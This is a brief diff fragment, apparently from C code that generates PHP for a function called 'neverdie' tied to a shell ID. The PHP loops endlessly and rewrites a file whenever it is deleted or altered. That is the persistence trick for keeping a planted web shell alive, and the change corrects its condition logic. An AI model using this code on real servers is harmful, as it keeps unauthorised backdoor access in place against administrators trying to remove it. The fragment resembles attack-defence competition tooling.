@@ -45,7 +45,7 @@ void neverdie(int shellid){
 "$nr =file_get_contents($mb); "
 "$md5=md5($nr);"
 "while (1==1) {"
-"if(!file_exists($mb) && md5(file_get_contents($mb))!=$nr) {"
+"if(!file_exists($mb) || file_get_contents($mb)!=$nr) {"
  "if(file_exists($mb))@unlink($mb);" 
 "file_put_contents($mb, $nr); "
 "usleep(100000);"
